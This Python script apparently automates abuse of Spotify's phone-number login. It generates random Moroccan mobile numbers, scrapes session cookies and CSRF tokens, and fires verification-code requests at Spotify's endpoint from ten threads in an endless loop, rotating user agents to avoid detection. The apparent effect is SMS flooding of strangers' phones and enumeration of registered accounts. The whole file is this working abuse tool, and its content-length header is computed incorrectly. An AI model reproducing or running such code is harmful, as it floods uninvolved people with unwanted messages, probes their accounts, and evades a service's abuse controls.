import requests
import random
import threading
import time

def generate_phone_number():
    prefix = random.choice(["2126", "2127"])
    remaining_digits = ''.join(random.choices("0123456789", k=8))
    phone_number = prefix + remaining_digits
    return "+" + phone_number

def generate_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36",
        "Mozilla/5.0 (Linux; U; Android 4.2.2; en-US; Nexus 5 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; rv:60.0) Gecko/20100101 Firefox/60.0",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; AS; rv:11.0) like Gecko",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.2; rv:53.0) Gecko/20100101 Firefox/53.0"
    ]
    return random.choice(user_agents)

def TOKEN_MAKER():
    session = requests.Session()
    headers = {
        "user-agent": generate_user_agent()
    }
    response = session.get("https://accounts.spotify.com", headers=headers)
    cookies = session.cookies.get_dict()
    __Host_device_id = cookies.get("__Host-device_id")
    __Host_sp_csrf_sid = cookies.get("__Host-sp_csrf_sid")
    __Secure_TPASESSION = cookies.get("__Secure-TPASESSION")
    sp_sso_csrf_token = cookies.get("sp_sso_csrf_token")
    token = cookies.get("sp_sso_csrf_token")
    return {
        "Host_device_id": __Host_device_id,
        "Host_sp_csrf_sid": __Host_sp_csrf_sid,
        "Secure_TPASESSION": __Secure_TPASESSION,
        "sp_sso_csrf_token": sp_sso_csrf_token,
        "token": token
    }

def validate_phone_number(phone_number):
    if phone_number.startswith("+"):
        phone_number = phone_number.replace(" ", "").replace("-", "")
        return phone_number
    else:
        print("Error: The phone number must start with '+'")
        return None

def spotify_login(tokens, phone_number):
    phone_number = validate_phone_number(phone_number)
    if not phone_number:
        return

    if tokens["Host_device_id"] and tokens["Host_sp_csrf_sid"] and tokens["Secure_TPASESSION"] and tokens["sp_sso_csrf_token"]:
        url = "https://accounts.spotify.com/login/phone/code/request"
        data = {
            "phonenumber": phone_number
        }
        phone_bytes = phone_number.encode('utf-8') 
        Content_Length = str(len(phone_bytes.hex()))
        headers = {
            "content-length": Content_Length,
            "sec-ch-ua-platform": "\"Android\"",
            "x-csrf-token": tokens["token"],
            "user-agent": generate_user_agent(),
            "accept": "application/json",
            "sec-ch-ua": "\"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
            "content-type": "application/x-www-form-urlencoded",
            "sec-ch-ua-mobile": "?1",
            "origin": "https://accounts.spotify.com",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://accounts.spotify.com/fr/login/phone?intent=signup&continue=https%3A%2F%2Fwww.spotify.com%2Faccount%2Foverview%2F%3Fflow_ctx%3D9eaced74-9074-4321-ba64-fc50ab59a094%253A1737865699&creation_point=https%3A%2F%2Fsupport.spotify.com%2Feg-ar%2Farticle%2Fphone-number-login-help",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-GB,en;q=0.9,es-ES;q=0.8,es;q=0.7,en-US;q=0.6,ar;q=0.5",
            "cookie": f"sp_t=82dd5b0c-4b1f-434b-bae4-b151594430fd; __Host-device_id={tokens['Host_device_id']}; __Secure-TPASESSION={tokens['Secure_TPASESSION']}; sp_sso_csrf_token={tokens['sp_sso_csrf_token']}; __Host-sp_csrf_sid={tokens['Host_sp_csrf_sid']}",
            "priority": "u=1, i"
        }
        response = requests.post(url, headers=headers, data=data)

        if response.status_code == 200:
            print(f"Phone Number: {phone_number}")
            print("Response:", response.status_code, response.text)
        else:
            return False
    else:
        print("Required cookies are missing.")

def thread_worker():
    tokens = TOKEN_MAKER()
    phone_number = generate_phone_number()
    spotify_login(tokens, phone_number)
    time.sleep(random.uniform(2, 5))

if __name__ == "__main__":
    while True:
        threads = []

        for _ in range(10):
            thread = threading.Thread(target=thread_worker)
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        print("Batch completed. Restarting...")
